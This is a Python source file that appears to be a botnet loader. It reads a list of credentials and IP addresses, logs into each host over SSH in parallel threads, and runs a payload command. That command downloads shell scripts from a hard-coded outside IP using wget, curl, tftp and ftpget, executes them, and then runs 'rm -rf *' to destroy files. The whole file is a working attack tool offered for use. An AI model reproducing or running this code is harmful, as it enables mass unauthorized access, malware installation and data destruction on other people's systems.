import sys
import paramiko
import threading


PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.80.26/8UsA.sh; curl -O http://163.172.80.26/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 163.172.80.26 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 163.172.80.26; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 163.172.80.26 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *"

def load(username, password, ip):
    print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;32mLOADING\x1b[1;31m]\x1b[0;37m loading "+ip+" with "+username+":"+password+"")
    sshobj = paramiko.SSHClient()
    sshobj.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sshobj.connect(ip, username=username, password=password, port=22, look_for_keys=True, timeout=10)
        print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;32mLOADER\x1b[1;31m]\x1b[0;37m logged in to " + ip + " with " + username + ":" + password + "")
    except Exception as e:
        # paramiko raises SSHException('No authentication methods available',) since we did not specify any auth methods. socket stays open.
        print("\x1b[1;31m[\x1b[1;33mERROR\x1b[1;31m] = [\x1b[1;33mNot Loaded\x1b[1;31m] \x1b[0;37" + ip + " with " + username + ":" + password + " >> Exception: "+str(e))
        return
    stdin, stdout, stderr = sshobj.exec_command(PAYLOAD)
    print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;36mServer\x1b[1;31m|\x1b[1;36mBruteLogin\x1b[1;31m]\x1b[0;37m Server output: "+"".join(stdout.readlines()).strip())
if not len(sys.argv) > 1:
    print("\x1b[1;31m[\x1b[1;33mERROR\x1b[1;31m]\x1b[0;37m " + sys.argv[0] + " <file to load>")
    exit(-1)
with open(sys.argv[1], "r") as file:
    for server in file:
        splitted = server.split(":")
        threading.Thread(target=load, args=(splitted[0], splitted[1], splitted[2])).start()


